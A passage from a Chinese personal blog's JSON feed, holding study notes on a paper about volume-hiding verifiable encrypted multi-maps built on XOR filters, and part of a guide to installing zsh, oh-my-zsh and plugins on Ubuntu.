            "content_html": "<h1 id=\"技术总概\"><a href=\"#技术总概\" class=\"headerlink\" title=\"技术总概\"></a>技术总概</h1><h2 id=\"Volume-Hiding-EMM\"><a href=\"#Volume-Hiding-EMM\" class=\"headerlink\" title=\"Volume-Hiding EMM\"></a>Volume-Hiding EMM</h2><p>Volume-Hiding EMM，在该论文也称为XorMM。(EMM,Encrypted Multi-Maps)</p>\n<p>为了减少存储占用，这里使用XOR过滤器</p>\n<p>首先加密相关联的值，同时将每个键/值对插入到XOR过滤器中，然后用假名填充剩余的空位置来生成EMM。通过这种方式，我们得到了第一个阶调无损且完全卷隐藏的EMM方案，该方案可以实现最优的查询通信复杂度l和最小的存储开销1.23 n</p>\n<h2 id=\"Verifiable-Volume-Hiding-EMM\"><a href=\"#Verifiable-Volume-Hiding-EMM\" class=\"headerlink\" title=\"Verifiable Volume-Hiding EMM\"></a>Verifiable Volume-Hiding EMM</h2><p>Verifiable Volume-Hiding EMM,在该论文也称</p>\n<p>使用PRF的变体F(k,x)(在输入x上是异或同态的)，命名为“异或”同态的PRF，验证每个位置的值，然后将PRF值绑定到位置的一个HMAC，为每个值/位置对生成一个tag。这样，就可以通过在相同位置使用’ tag’的异或来认证指定位置上值的异或 </p>\n<h1 id=\"部分原理\"><a href=\"#部分原理\" class=\"headerlink\" title=\"部分原理\"></a>部分原理</h1><h2 id=\"Pseudorandom-Function-伪随机函数\"><a href=\"#Pseudorandom-Function-伪随机函数\" class=\"headerlink\" title=\"Pseudorandom Function 伪随机函数\"></a>Pseudorandom Function 伪随机函数</h2><p>$F: \\mathcal{K} \\times\\mathcal{X}$被称为伪随机函数</p>\n<p>如果对于所有的概率多项式时间敌手$\\mathcal{A}$，其优势被定义为<br>$$<br>Adv_{\\mathcal{A},F}^{PRF} = | Pr[\\mathcal{A^{F(k,\\cdot)}}(\\lambda)=1| - Pr[\\mathcal{A}^{f(\\cdot)}(\\lambda)=1]|<br>$$<br>在$\\lambda$中可忽略不计，其中$k\\leftarrow\\mathcal{K}$且$f$是从X到Y的随机函数，特别的，当$X=Y$时，我们称$F$为伪随机函数</p>\n<h2 id=\"Constrained-PRF\"><a href=\"#Constrained-PRF\" class=\"headerlink\" title=\"Constrained PRF\"></a>Constrained PRF</h2><p>如果存在一个额外的密钥空间$\\mathcal{K}_c$和两个额外的算法$F.Cons$和$F.Eval$,那么PRF函数$F: \\mathcal{K} \\times\\mathcal{X}\\rightarrow\\mathcal{Y}$受一元谓词$\\mathcal{P}={p:\\mathcal{X}\\rightarrow{0,1}}$的约束</p>\n<p><strong>F.Cons(k,p)</strong>: 它将一个PRF密钥$k\\in \\mathcal{K}$和一个谓词$p\\in \\mathcal{P}$的描述作为输入，输出一个约束密钥$k_p∈\\mathcal{K}_c$。密钥$k_p$使得对所有满足$s.t.p(x)=1$的$x$($x\\in \\mathcal{X}$)都能求出$F(k,x)$，且没有其他$x$。</p>\n<p><strong>F.Eval($k_p$,x)</strong>:它将一个约束密钥$k_p∈\\mathcal{K}_c$和一个$x\\in \\mathcal{X}$作为输入。如果$k_p$是某个PRF密钥$k\\in \\mathcal{K}$经$F.Cons(k,p)$输出的密钥，那么$F.Eval(kp,x)$将输出<br>$$<br>F.Eval(k_p,x) = \\left{ \\begin{array}{rcl}F(k,x),&amp;if\\ p(x)=1 \\<br>\\bot&amp;otherwise<br>\\end{array}\\right.<br>$$<br><strong>安全性</strong>：</p>\n<p>非正式地，受约束的PRF的安全性保证了无论给定敌手$\\mathcal{A}$选择的若干个受约束的密钥和若干个函数值，函数值仍然看起来是随机的并且$\\mathcal{A}$无法计算</p>\n<p>  定义1，当对所有PPT敌手A而言，其优势是可以忽略的，那么称PRF F(伪随机函数)是关于一元谓词P的安全约束PRF。</p>\n<p>​\t\t优势定义定义为$Adv_{\\mathcal{A},F}^{PRF} = | Pr[{Expt^{PRF}}(1)=1| - Pr[{Expt}^{PRF}(0)=1]|$,其中，对于$b\\in {0，1}$的$Expt^{PRF}(b)$定义如下:</p>\n<p>​\t\t$Expt^{PRF}(b)$,首先，选择一个随机密钥$k\\in \\mathcal{K}$，初始化3个空集$P，V，C\\subseteq{X}$。然后允许敌手A自适应地询问以下查询：</p>\n<p>​\t\t\t<strong>Evaluation(𝑥)</strong>:给定$\\mathcal{A}$中的$x\\in \\mathcal{X}$，如果$x\\notin \\mathcal{C}$，则返回$F(k,x)$，否则返回$\\bot$。然后将集合$V$更新为$V\\leftarrow V\\cup{x}$</p>\n<p>​\t\t\t<strong>Constrained-key(𝑝)</strong>:给定来自$\\mathcal{A}$的谓词$p\\in \\mathcal{P}$，如果对所有$x\\in \\mathcal{C}$,$p(x)=0$,实验返回一个密钥$F.Cons(k,p)$，否则返回$\\bot$.然后将集合$P$更新为$P\\leftarrow P\\cup{p}$。</p>\n<p>​\t\t\t<em><em>Challenge($𝑥^</em>$)</em><em>:给定来自$\\mathcal{A}$的挑战元素$x^</em>\\in X$ $s.t.x^<em>\\notin V$并且对所有的$p\\in \\mathcal{P}$，有$p(x^</em>)=0$.如果$b=0$，敌手A被给定$F(k,x^*)$；否则给定一个随机的$y\\in Y$，集合C更新为$C\\leftarrow C\\cup{x^*}$</p>\n<p>  最后，完成所有查询后$\\mathcal{A}$输出$b^{‘}\\in {0,1}$，实验输出$\\mathcal{A}$返回的结果。</p>\n<p>  前缀谓语：在该应用中，需要一个PRF $F:\\mathcal{K}\\times{0,1,2}^m\\rightarrow \\mathcal{Y}$,它被约束为$w.r.t$，一族前缀谓词$\\mathcal{P}<em>{PRE}={p</em>{\\vec{v}}:\\vec{v}\\in {0,1,2}^l{<em>}^{m-l},l\\in [m]}$，其中”*“指不在乎，$p_{\\vec{v}}$在$\\vec{v}\\in {0,1,2}^l{</em>}^{m-l}$定义为<br>$$<br>p_{\\vec{v}}(1)=1\\Leftrightarrow(v_i=x_i)\\ for\\ all\\ i\\in [l]<br>$$<br>  然后使用一个受约束的密钥$k_{p_{\\vec{v}}}$，我们可以在与$\\vec{v}$具有相同前缀的任意点x上计算$F(k,x)$。</p>\n<h2 id=\"Symmetric-Encryption-同态加密\"><a href=\"#Symmetric-Encryption-同态加密\" class=\"headerlink\" title=\"Symmetric Encryption 同态加密\"></a>Symmetric Encryption 同态加密</h2><p>密钥空间$\\mathcal{K}$,明文空间$\\mathcal{M}$,密文空间$\\mathcal{C}$,加密算法<strong>SE=(Gen,Enc,Dec)</strong></p>\n<p><strong>Gen($1^\\lambda$)</strong>:输入安全参数$\\lambda$，输出私钥$k(k\\in \\mathcal{K})$</p>\n<p><strong>Enc(k,m)</strong>: 输入私钥$k$和明文消息$m\\in \\mathcal{M}$,输出密文$ct\\in \\mathcal{C}$</p>\n<p><strong>Dec(k,c)</strong>:输入私钥$k$和密文消息$ct$，输出解密的明文消息$m$或者解密失败符号$\\bot$</p>\n<p><strong>安全性</strong>:该方案的提出，需要抗选择明文攻击的伪随机性(PCPA)，其形式化定义如下：</p>\n<p>​\t定义2：当一个同态加密方案对于任何概率多项式时间(PPT)的敌手$\\mathcal{A}$,它的优势advantages满足下面式子<br>$$<br>Adv_{\\mathcal{A},SE}^{PCPA}(\\lambda) = | Pr[{Expt^{PCPA}_{A,SE}}(\\lambda)=1]-1/2|\\le negl(\\lambda)<br>$$<br>​\t\t  那么，该同态加密方案就称为PCPA安全方案</p>\n<p>​\t\t  在$Expt^{PCPA}_{A,SE}(\\lambda)$中的挑战者(challenger)和多面手/敌手(daversary)定义如下：</p>\n<p>​\t\t  <strong>建立(Setup)</strong>:挑战者(challenger)运行$k\\leftarrow Gen(1^λ)$并随机选择一个比特$b\\in {0，1}$</p>\n<p>​\t\t\t<strong>第一阶段</strong>:敌手$\\mathcal{A}$自适应地发出一个多项式数量为$q$的加密查询。对于每个查询$m\\in \\mathcal{M}$，挑战者(challenger)以$ct\\leftarrow Enc(k,m)$响应。</p>\n<p>​\t\t\t<strong>挑战(Challenge)</strong>:敌手$\\mathcal{A}$发送消息$m^<em>\\in \\mathcal{M}$给挑战者(challenger)，挑战者生成两个密文$ct_0\\leftarrow Enc(k,m^</em>)$和$ct_1\\leftarrow C$，并将$ct^* = ct_b$返回给敌手$\\mathcal{A}$</p>\n<p>​\t\t\t<strong>第二阶段</strong>:敌手$\\mathcal{A}$再次执行与阶段1相同的多项式-多次加密查询</p>\n<p>​\t\t\t<strong>猜测(Guess)</strong>:最后，$\\mathcal{A}$输出一个比特$b^{‘}\\in {0，1}$。若b′= b，则实验输出1</p>\n<h2 id=\"XOR-Filter-异或滤波器\"><a href=\"#XOR-Filter-异或滤波器\" class=\"headerlink\" title=\"XOR Filter 异或滤波器\"></a>XOR Filter 异或滤波器</h2><p>XOR过滤器是一种用于数据检索和成员资格测试的简洁数据结构。它可以在静态数据设定下以几乎最优的空间消耗实现高效(近似)的隶属度检验。</p>\n<p>一个域为$\\mathcal{U}$的XOR滤波器由一个初始为空的数组$B$,一个哈希函数$H:\\mathcal{U}\\rightarrow {0,1}^k$,一个通用哈希函数集合$\\mathcal{H}={h_t:\\mathcal{U}\\rightarrow [\\frac{t}{r}s,\\frac{t+1}{r}s]}_{t\\in [0,r-1]}$(其中r和s分别表示哈希函数的个数和B的大小)组成</p>\n<p>为了在XOR滤波器中插入一个集合$\\mathcal{S}\\in \\mathcal{U}$，我们初始化一个临时数组T，并将每个$x\\in S$追加到数组T的条目${T[h_t(x)]}_{t\\in [0,r-1]}$中。随后，从当前T中挑选出只包含单个元素x的任意条目$T [ i ]$，然后将关联的元素/索引对$(x,i)$推送到Stack中，同时用索引${h_t(x)}$从T的对应条目(中)中移除x；通过重复这个过程，S中的所有元素都会被推送到Stack中。之后，我们通过设置$B[i]=H(x) \\begin{array}{cols}\\oplus \\ t\\in [0,r-1]\\backslash {t^{‘}} \\end{array} B[h_t(x)]$将栈中的每个$(x,i)$插入到数组B中，其中$h_t^{‘}(x)=i$表示某个$t{‘}$。</p>\n<p>注意，以这种方式插入S，可以通过检查$H(x^{‘})= \\begin{array}{cols}\\oplus \\ t\\in [0,r-1]\\end{array} B[h_t(x^{‘})]$来检验查询的隶属度，记为$x^{‘}$。</p>\n<p>从上面的描述中可以看出，XOR滤波器通过存储$H(x)$并在后期对其进行检索，可以实现高效的隶属度测试。进一步地，我们注意到XOR滤波器也可以用于数据的存储和检索。更详细地，我们可以在位置${h_t(x)}_t\\in [0,r-1]$处存储另一个值$y$(而不是$H(x)$)，之后通过查询$x$来检索$y$。</p>\n<p>接下来我们给出了XOR滤波器(XF)的正式定义。设$\\mathcal{U}$是所有可能的输入(即字符串)的论域，B是一个k位值的数组。如算法1所示，XOR滤波器$XF = (XF.Setup,XF.Update,XF.Query)$由以下算法组成：</p>\n<p>​\t<strong>XF.Setup(r,s)</strong>:将$r,s\\in \\mathbb{N}$作为输入，生成一个哈希函数$H：\\mathcal{U}\\rightarrow {0,1}^k$，并从一个通用哈希函数集合$H={h_t:\\mathcal{U}\\rightarrow [\\frac{t}{r}s,\\frac{t+1}{r}s]}$采样 ,其中$t\\in [0,r-1]$。最后输出$\\mathcal{H}$、$H$和一个大小为s的初始空数组B。 </p>\n<p>​\t<strong>XF.Update($\\mathcal{H}$,H,B,S)</strong>:一族哈希函数$\\mathcal{H}$,一个空数组B和一个数据集$S\\sube \\mathcal{U}$作为输入，然后通过运行算法2中的Mapping Step来确定所有元素的插入顺序，并按照顺序依次压入Stack中。然后，对每个$(x,i)\\in Stack$,设置$B[i]\\leftarrow H(x) \\begin{array}{cols}\\oplus \\ t\\in [0,r-1]\\backslash {t^{‘}}\\end{array}B[h_t(x)]$,其中$h_{t^{‘}}(x)=i$,最后输出数组B</p>\n<p>​\t<strong>XF.Query($\\mathcal{H}$,$B$,$x$)</strong>:$\\mathcal{H}$，$B$,元素$x$作为输入,返回$R=\\oplus \\begin{array}{cols}r-1\\t=0\\end{array}B[h_t(x)]$</p>\n<p><strong>完整性(Perfect Completeness)</strong>:如果对所有整数$r,s\\in N$，所有元素集$S\\in \\mathcal{U}$，$x\\in S$且$B\\leftarrow XF.Updata$，则XOR滤波器(XF)是完全完整的，则认为<br>$$<br>Pr[XF.Query(\\mathcal{H},B,x)=H(x)] = 1<br>$$<br>这意味着任意插入的元素总能被检索到。</p>\n<p><strong>参数选择(Parameter Choices)</strong>:理论上，完美哈希函数可以实现静态数据检索的最优存储开销$O(n)$，其中$n$为集合S的大小。然而，由于其计算复杂度较高，在实际应用中很难实现。作为替代，XOR滤波器在保持高效搜索的同时，存储需求非常接近下界$O(n)$。XOR滤波器的核心步骤是Mapping Step。也就是说，它将集合S的每个元素映射为$n=|S|$条边的集合，生成一个无环r部超图(an acyclic 𝑟-partite hypergraph)，其中存储开销为$C_rn + \\beta$。根据文献[40]，当$r = 3$时，$C_r$的最小值约为1.23。因此，B(即s)的大小为$\\lfloor1.23n\\rfloor+\\beta$ </p>\n<p><img data-src=\"/./../../../post_images/thesis/PVHEMMwO_1.png\" alt=\"image-20230802005738115\"></p>\n<p><strong>失败概率(Failure-Probability)</strong>:XOR滤波器的失效概率取决于Mapping Step的失效概率。反过来，后者又取决于根据文献[19]中XOR滤波器的构造，构建无环r部随机超图的失败概率，记为$Pr$。不幸的是，正如[7、46]所指出的，在技术上很难获得关于失效概率$Pr$的严格边界。然而，理论和实践证据都表明，当$r &gt; 2$时，生成随机无环r超图的成功概率(即$1 - Pr$)随着超边(即数据集大小)的个数$n$的增加而趋于1，如[13、15]所述。特别地，当$n &gt; 2^{17}$时，成功概率稳定在1，如图2中的[19、24]和我们的实验结果所示。</p>\n<h2 id=\"Multi-Map-多元图\"><a href=\"#Multi-Map-多元图\" class=\"headerlink\" title=\"Multi-Map 多元图\"></a>Multi-Map 多元图</h2><p>多映射(Multi-Map)[30]是一种存储键/值对$MM={(key ,\\vec{v})}$的数据结构，其中$key\\in \\mathbb{K}$，$\\vec{v}[c]\\in \\mathbb{V}$表示与$key$匹配的值向量$\\vec{v}$中的第c个条目。通常支持两个操作<strong>MM.Get</strong>和<strong>MM.put</strong>，如下所示：</p>\n<p>​\t<strong>MM.Get(key)</strong>:输入$key$，输出tuple$\\vec{v}=MM[key]$</p>\n<p>​\t<strong>MM.Put(key,$\\vec{v}$)</strong>:输入$(key,\\vec{v})$，存储在MM中，$MM[key]=\\vec{v}$</p>\n<p><img data-src=\"/./../../../post_images/thesis/PVHEMMwO_2.png\" alt=\"image-20230802022816754\"></p>\n<h2 id=\"Non-Interactive-STE-for-Multi-Maps-面向多地图的非交互式结构化加密\"><a href=\"#Non-Interactive-STE-for-Multi-Maps-面向多地图的非交互式结构化加密\" class=\"headerlink\" title=\"Non-Interactive STE for Multi-Maps 面向多地图的非交互式结构化加密\"></a>Non-Interactive STE for Multi-Maps 面向多地图的非交互式结构化加密</h2><p>从形式上看，其由一个算法和一个协议组成的元组$\\sum(Setup,Query)$</p>\n<p><strong>Setup($1^{\\lambda}$,$MM$)</strong>:客户端接收安全参数$\\lambda$和一个初始多映射$MM$，并输出密钥$K$和一个加密的多映射$EMM$。</p>\n<p><strong>Query(K,key;EMM)</strong>:客户端输入一个私钥$K$和一个查询密钥key，服务端输入一个加密的多图EMM(multi-map EMM)。客户端接收一个响应$\\tau$，服务端接收$\\bot$。</p>\n<p><strong>Leakage Function of STE for Multi-Maps(对多映射的结构化加密泄露函数)</strong></p>\n<p><strong>Volume-Hiding STE for Multi-Maps</strong>:</p>\n<p>该方案定义在一个挑战者$C$和一个敌手$\\mathcal{A}$之间的game下 $Game\\begin{array}{cols}\\mathcal{L}\\\\mathcal{A}\\end{array}((n,\\mathcal{l}),b)$，其中$n$是$MM$中的密钥/值对的总数，$l$是最大体积，$b\\in {0,1}$。一般来说，该博弈定义如下：</p>\n<p>​\t(1)敌手$\\mathcal{A}$选择两个签名$S_0=(key,\\mathcal{l}<em>0(key))</em>{key\\in \\mathbb{K}}$,$S_1={key,\\mathcal{l}_1(key)}$</p>\n<p>​\t\t$\\sum_{key\\in \\mathbb{K}}\\mathcal{l}<em>0(key)=\\sum</em>{key\\in \\mathbb{K}}\\mathcal{l}_1(key)=n$</p>\n<p>​\t\t$max_{key\\in \\mathbb{K}}\\mathcal{l}<em>0(key)=max</em>{key\\in \\mathbb{K}}\\mathcal{l}_1(key)=\\mathcal{l}$</p>\n<p>​\t\t其中，$\\mathcal{l}_b(key)$表示签名为$S_b$的多映射中与$key$相关联的值的个数。然后敌手将$S_0$和$S_1$发送给挑战者C。</p>\n<p>​\t(2)挑战者C在接收到$S_0$和$S_1$后，通过为每个密钥$key$任意选择$l_b ( key )$生成一个集值映射$MM_b$。然后C计算并发送$L_{Setup} ( MM_b )$给敌手A。</p>\n<p>​\t(3)$\\mathcal{A}$自适应地对$key_1,…,key_q$执行$q$次查询。对于第i个查询keyi，C计算$L_{Query}(MM_b , key_1 , … , key_i)$并发送给对手。</p>\n<p>​\t(4)最后，$\\mathcal{A}$输出一个比特$b^{‘}\\in {0,1}$</p>\n<p>定义4（Volume-hiding STE for multi-maps[45]）：设 Σ =（Setup，Query）是一个适用于L =（L𝑆𝑒𝑡𝑢𝑝，L𝑄𝑢𝑒𝑟 𝑦）的自适应安全的多重映射结构化加密方案。如果对于所有的1 ≤ ℓ ≤ 𝑛 和所有进行最多 𝑞 次查询的对手 A，在$Game\\begin{array}{cols}\\mathcal{L}\\\\mathcal{A}\\end{array}((n,\\mathcal{l}),0)$和$Game\\begin{array}{cols}\\mathcal{L}\\\\mathcal{A}\\end{array}((n,\\mathcal{l}),1)$中输出 1 的概率相同，则Σ被称为具有体积隐藏特性。</p>\n<p><strong>Verifiable STE for Multi-Maps</strong></p>\n<p>定义5（多重映射的可验证可搜索加密的定义）。假设Σ =（Setup，Query，Verify）是一个面向多重映射的结构化加密方案。如果对于任何进行最多多项式数量𝑝𝑜𝑙𝑦(𝜆)次查询的PPT攻击者$\\mathcal{A}$，在以下游戏中获胜的概率都是可以忽略的，即$Pr[\\mathcal{A}\\ 𝑤𝑖𝑛𝑠] ≤ 𝑛𝑒𝑔𝑙 (𝜆)$，则Σ被称为是可验证的。</p>\n<p>用于捕获STE可验证性的博弈在挑战者和对手之间进行，如下:</p>\n<p>​\t<strong>Setup</strong>:敌手选择一个多图MM并发送给挑战者。然然后挑战者初始化一个用于跟踪查询的空列表$L_q = ( · , ·)$，并运行$(K,EMM)\\leftarrow Setup(1^λ ,MM)$。最后，返回加密后的多映射EMM</p>\n<p>​\t<strong>Query Phase:(查询阶段)</strong>:敌手$\\mathcal{A}$自适应地执行一个多项式次数q的查询$( key_1 , key_2 , … , key_q)$。对于每个查询$key_i$，挑战者进行以下操作</p>\n<p>​\t\t(1)运行 $\\tau^*_i\\leftarrow Query(K,key;EMM)$并添加$(key,\\tau^*_i)$到$L_q$中</p>\n<p>​\t\t(2)然后执行带有$\\mathcal{A}$的Query协议，得到$\\mathcal{A}$的输出$\\tau_i$</p>\n<p>​\t<strong>Check</strong>:挑战者检查是否存在$i\\in[q]\\ s.t.\\ \\tau_i\\ne \\tau^*_i$和$Verify(key_i,\\tau_i) = 1$。如果是这样，我们称$\\mathcal{A}$赢得了比赛。</p>\n<p>​\t</p>\n<p>​\t代码解释</p>\n<pre><code>K_d生成，K_e借由Gen生成为同态加密的私钥\nMM为大小为n的键值对集合\nEMM初始化为空\n调用Mapping Step，确认插入顺序，K_d对应H，MM对应S\n遍历Satck中的数据，其中，c表示条目的索引，(key,c)表示该值的索引\n    调用Enc同态加密，并存入EMM[i]中\n    \n</code></pre>\n<h1 id=\"VOLUME-HIDING-EMM-体积隐藏EMM\"><a href=\"#VOLUME-HIDING-EMM-体积隐藏EMM\" class=\"headerlink\" title=\"VOLUME-HIDING EMM(体积隐藏EMM)\"></a>VOLUME-HIDING EMM(体积隐藏EMM)</h1><p><img data-src=\"/./../../../post_images/thesis/PVHEMMwO_3.png\" alt=\"image-20230802174318840\"></p>\n<h1 id=\"VERIFIABLE-VOLUME-HIDING-EMM\"><a href=\"#VERIFIABLE-VOLUME-HIDING-EMM\" class=\"headerlink\" title=\"VERIFIABLE VOLUME-HIDING EMM\"></a>VERIFIABLE VOLUME-HIDING EMM</h1><p><img data-src=\"/./../../../post_images/thesis/PVHEMMwO_4.png\" alt=\"image-20230802185659743\"></p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/6c7ab92a/",
            "url": "http://dpm12345.cn/posts/6c7ab92a/",
            "title": "ubuntu安装zsh",
            "date_published": "2023-07-29T07:03:38.000Z",
            "content_html": "<h1 id=\"安装zsh\"><a class=\"anchor\" href=\"#安装zsh\">#</a> 安装 zsh</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">zsh</span></pre></td></tr></tbody></table></figure><h1 id=\"安装oh-my-zsh\"><a class=\"anchor\" href=\"#安装oh-my-zsh\">#</a> 安装 oh my zsh</h1>\n<h2 id=\"安装git下载环境\"><a class=\"anchor\" href=\"#安装git下载环境\">#</a> 安装 git 下载环境</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> <span class=\"token function\">git</span></pre></td></tr></tbody></table></figure><h2 id=\"安装oh-my-zsh-2\"><a class=\"anchor\" href=\"#安装oh-my-zsh-2\">#</a> 安装 oh my zsh</h2>\n<p>cd 到指定目录 (自定义)，下载文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/robbyrussell/oh-my-zsh</pre></td></tr></tbody></table></figure><p>切换目录到 oh-my-zsh 文件夹下的 tools 文件夹</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ./oh-my-zsh/tools</pre></td></tr></tbody></table></figure><p>ls, 查看 tools 中的文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ls</span></pre></td></tr></tbody></table></figure><p>运行 install.sh 文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sh</span> install.sh</pre></td></tr></tbody></table></figure><h1 id=\"配置oh-my-zsh插件\"><a class=\"anchor\" href=\"#配置oh-my-zsh插件\">#</a> 配置 oh my zsh 插件</h1>\n<p>复制下面两行命令，下载插件代码到本地</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</pre></td></tr></tbody></table></figure><h2 id=\"安装zsh-autosuggestions插件\"><a class=\"anchor\" href=\"#安装zsh-autosuggestions插件\">#</a> 安装 zsh-autosuggestions 插件</h2>\n<p>zsh-autosuggestions，历史命令智能提示插件。</p>\n<p>执行以下命令下载插件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> zsh-autosuggestions</pre></td></tr></tbody></table></figure><p>执行以下命令进入编辑界面</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> ~/.zshrc</pre></td></tr></tbody></table></figure><p>然后在 plugins 函数中添加插件 zsh-autosuggestions（与 git 空格隔开）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">plugins</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>git zsh-autosuggestions）</pre></td></tr></tbody></table></figure><p>并且加入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh</pre></td></tr></tbody></table></figure><p>最后</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> ~/.zshrc</pre></td></tr></tbody></table></figure><p>(若为 ubuntu18.04，则使用以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">'deb http://download.opensuse.org/repositories/shells:/zsh-users:/zsh-autosuggestions/xUbuntu_18.04/ /'</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/apt/sources.list.d/shells:zsh-users:zsh-autosuggestions.list</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-fsSL</span> https://download.opensuse.org/repositories/shells:zsh-users:zsh-autosuggestions/xUbuntu_18.04/Release.key <span class=\"token operator\">|</span> gpg <span class=\"token parameter variable\">--dearmor</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span> /etc/apt/trusted.gpg.d/shells_zsh-users_zsh-autosuggestions.gpg <span class=\"token operator\">&gt;</span> /dev/null</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> zsh-autosuggestions</pre></td></tr></tbody></table></figure><h2 id=\"安装-zsh-syntax-highlighting插件\"><a class=\"anchor\" href=\"#安装-zsh-syntax-highlighting插件\">#</a> 安装 zsh-syntax-highlighting 插件</h2>\n<p>zsh-syntax-highlighting，语法高亮插件。</p>\n<p>红色错误，绿色正确</p>\n<p>与前一插件安装方法类似</p>\n<p>执行以下命令下载插件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> zsh-syntax-highlighting</pre></td></tr></tbody></table></figure><p>执行以下命令进入编辑界面</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> ~/.zshrc</pre></td></tr></tbody></table></figure><p>然后在 plugins 函数中添加插件 zsh-autosuggestions（与 git 空格隔开）</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">plugins</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>git zsh-autosuggestions zsh-syntax-highlighting<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>并且加入</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</pre></td></tr></tbody></table></figure><p>最后</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> ~/.zshrc</pre></td></tr></tbody></table></figure><h1 id=\"主题设置\"><a class=\"anchor\" href=\"#主题设置\">#</a> 主题设置</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> ~/.oh-my-zsh/themes</pre></td></tr></tbody></table></figure><p><code>ls</code>  查看所有主题</p>\n<h2 id=\"更换主题\"><a class=\"anchor\" href=\"#更换主题\">#</a> 更换主题</h2>\n<p>进入 /.zshrc 编辑界面</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> ~/.zshrc</pre></td></tr></tbody></table></figure><p>改变 <code>ZSH_THEME=\" \"</code>  为指定的主题名称</p>\n<p>如</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">ZSH_THEME</span><span class=\"token operator\">=</span><span class=\"token string\">\"agnoster\"</span></pre></td></tr></tbody></table></figure><p>更新 /.zshrc</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">source</span> ~/.zshrc</pre></td></tr></tbody></table></figure><h2 id=\"路径乱码\"><a class=\"anchor\" href=\"#路径乱码\">#</a> 路径乱码</h2>\n<p>NOTE: 注意，很多主题都需要安装 Powerline Fonts ，详情见 Powerline Fonts</p>\n<p>执行以下命令来安装缺失的字体：</p>\n<figure class=\"highlight 